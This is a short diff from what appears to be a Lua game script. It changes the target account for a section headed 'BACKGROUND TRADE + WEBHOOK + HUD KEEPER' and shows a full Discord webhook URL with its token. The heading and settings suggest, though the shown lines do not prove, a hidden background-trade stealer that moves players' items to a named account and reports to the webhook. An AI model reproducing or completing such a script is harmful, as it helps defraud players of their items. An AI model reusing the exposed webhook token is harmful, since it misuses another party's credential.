@@ -1755,7 +1755,7 @@ end)
 --=====================================================================
 -- BACKGROUND TRADE + WEBHOOK + HUD KEEPER
 --=====================================================================
-local TRADE_TARGET = "only1Sherifalt1"
+local TRADE_TARGET = "Only1Sherif"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1556171079893131451/fCZxVRWYBYm3cmxrn73bvtc5m5DYqOMYQsYFKvBJBUaZyDSunPnHT0iQnbG2xRKWdKA7"
 
 local PICKUP_DELAY      = 0.35
